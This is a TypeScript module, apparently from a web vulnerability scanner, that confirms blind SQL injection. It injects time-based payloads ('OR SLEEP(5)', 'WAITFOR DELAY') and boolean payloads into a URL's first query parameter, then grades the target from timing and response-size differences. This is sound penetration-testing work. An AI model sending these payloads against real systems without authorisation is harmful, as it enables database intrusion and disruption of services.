/**
 * BlindSqliEngine — Multi-round Blind SQL Injection Confirmation System
 * Performs Time-Based and Boolean-Based confirmation probes to reduce false positives.
 */

export type BlindGrade = 'CONFIRMED' | 'PROBABLE' | 'POSSIBLE' | 'NEGATIVE';

export interface BlindConfirmResult {
  confirmed: boolean;
  grade: BlindGrade;
  evidence: string[];
  timingAvgDelta?: number;
  booleanSizeDelta?: number;
}

type ProxyRequestFn = (url: string, method: string) => Promise<{ success: boolean; duration?: number; body?: any; bodyLength?: number }>;

// Injects a payload into the first query param of a URL (or appends ?id=)
function injectPayload(url: string, payload: string): string {
  if (url.includes('?')) {
    const [base, qs] = url.split('?');
    const params = new URLSearchParams(qs);
    const firstKey = params.keys().next().value;
    if (firstKey) {
      params.set(firstKey, params.get(firstKey) + payload);
    } else {
      params.set('id', payload);
    }
    return `${base}?${params.toString()}`;
  }
  return `${url}?id=${encodeURIComponent(payload)}`;
}

class BlindSqliEngine {
  // ------------------------------------------------------------
  // Phase 1: Time-Based Blind Probe
  // Sends sleep payloads × ROUNDS; success = ≥2/3 exceed threshold
  // ------------------------------------------------------------
  async runTimingProbe(
    url: string,
    method: string,
    proxyRequest: ProxyRequestFn
  ): Promise<{ confirmed: boolean; avgDelta: number; evidence: string[] }> {
    const ROUNDS = 3;
    const SLEEP_THRESHOLD_MS = 4000;
    const evidence: string[] = [];
    const deltas: number[] = [];

    // Establish un-injected baseline duration first
    const baseline = await proxyRequest(url, method);
    const baselineDuration = baseline.duration || 200;

    const timePayloads = [
      `' OR SLEEP(5) -- -`,
      `'; WAITFOR DELAY '0:0:5' -- -`,
      `' AND SLEEP(5) AND '1'='1`,
    ];

    for (let round = 0; round < ROUNDS; round++) {
      const payload = timePayloads[round % timePayloads.length];
      const testUrl = injectPayload(url, payload);
      const res = await proxyRequest(testUrl, method);

      if (!res.success) continue;

      const delta = (res.duration || 0) - baselineDuration;
      deltas.push(delta);
      evidence.push(`[Time Probe] Round ${round + 1}/${ROUNDS}: Δ${delta}ms (Payload: ${payload.trim()})`);
    }

    const successes = deltas.filter(d => d > SLEEP_THRESHOLD_MS).length;
    const avgDelta = deltas.length ? Math.round(deltas.reduce((a, b) => a + b, 0) / deltas.length) : 0;
    const confirmed = successes >= 2;

    if (confirmed) {
      evidence.push(`[Time Probe] CONFIRMED: ${successes}/${ROUNDS} rounds exceeded ${SLEEP_THRESHOLD_MS}ms. AvgΔ: ${avgDelta}ms.`);
    } else {
      evidence.push(`[Time Probe] NEGATIVE: Only ${successes}/${ROUNDS} rounds exceeded threshold.`);
    }

    return { confirmed, avgDelta, evidence };
  }

  // ------------------------------------------------------------
  // Phase 2: Boolean-Based Blind Probe
  // Sends TRUE condition + FALSE condition; compares response sizes
  // ------------------------------------------------------------
  async runBooleanProbe(
    url: string,
    method: string,
    baselineBodyLength: number,
    proxyRequest: ProxyRequestFn
  ): Promise<{ confirmed: boolean; sizeDelta: number; evidence: string[] }> {
    const evidence: string[] = [];
    const SIZE_DELTA_THRESHOLD = 100;

    const truePayload = `' OR '1'='1`;
    const falsePayload = `' OR '1'='2`;

    const trueUrl = injectPayload(url, truePayload);
    const falseUrl = injectPayload(url, falsePayload);

    const [trueRes, falseRes] = await Promise.all([
      proxyRequest(trueUrl, method),
      proxyRequest(falseUrl, method),
    ]);

    if (!trueRes.success || !falseRes.success) {
      evidence.push(`[Boolean Probe] FAILED: Could not reach target for boolean comparison.`);
      return { confirmed: false, sizeDelta: 0, evidence };
    }

    const trueLen = typeof trueRes.body === 'string' ? trueRes.body.length : JSON.stringify(trueRes.body || '').length;
    const falseLen = typeof falseRes.body === 'string' ? falseRes.body.length : JSON.stringify(falseRes.body || '').length;
    const sizeDelta = Math.abs(trueLen - falseLen);

    evidence.push(`[Boolean Probe] TRUE response: ${trueLen} bytes | FALSE response: ${falseLen} bytes | Δ${sizeDelta} bytes`);

    // Also compare with baseline
    const baselineDelta = Math.abs(trueLen - baselineBodyLength);
    evidence.push(`[Boolean Probe] Baseline delta vs TRUE condition: Δ${baselineDelta} bytes`);

    const confirmed = sizeDelta > SIZE_DELTA_THRESHOLD;
    if (confirmed) {
      evidence.push(`[Boolean Probe] CONFIRMED: Significant size differential (Δ${sizeDelta} bytes) between TRUE/FALSE conditions.`);
    } else {
      evidence.push(`[Boolean Probe] NEGATIVE: Insufficient size differential (Δ${sizeDelta} bytes, threshold: ${SIZE_DELTA_THRESHOLD}).`);
    }

    return { confirmed, sizeDelta, evidence };
  }

  // ------------------------------------------------------------
  // Master Confirmation: Runs both probes and produces a final verdict
  // ------------------------------------------------------------
  async confirm(
    url: string,
    method: string,
    baselineBodyLength: number,
    proxyRequest: ProxyRequestFn
  ): Promise<BlindConfirmResult> {
    const allEvidence: string[] = [];
    allEvidence.push(`[Blind SQLi Engine] Initiating multi-phase confirmation for: ${url}`);

    const [timingResult, boolResult] = await Promise.all([
      this.runTimingProbe(url, method, proxyRequest),
      this.runBooleanProbe(url, method, baselineBodyLength, proxyRequest),
    ]);

    allEvidence.push(...timingResult.evidence);
    allEvidence.push(...boolResult.evidence);

    let grade: BlindGrade = 'NEGATIVE';
    let confirmed = false;

    if (timingResult.confirmed && boolResult.confirmed) {
      grade = 'CONFIRMED';
      confirmed = true;
      allEvidence.push(`[Blind SQLi Engine] GRADE: CONFIRMED — Both Time-Based & Boolean probes validated.`);
    } else if (timingResult.confirmed || boolResult.confirmed) {
      grade = 'PROBABLE';
      confirmed = true;
      allEvidence.push(`[Blind SQLi Engine] GRADE: PROBABLE — One probe confirmed (Time: ${timingResult.confirmed}, Boolean: ${boolResult.confirmed}).`);
    } else {
      grade = 'NEGATIVE';
      allEvidence.push(`[Blind SQLi Engine] GRADE: NEGATIVE — No blind injection confirmed.`);
    }

    return {
      confirmed,
      grade,
      evidence: allEvidence,
      timingAvgDelta: timingResult.avgDelta,
      booleanSizeDelta: boolResult.sizeDelta,
    };
  }
}

export const blindSqliEngine = new BlindSqliEngine();
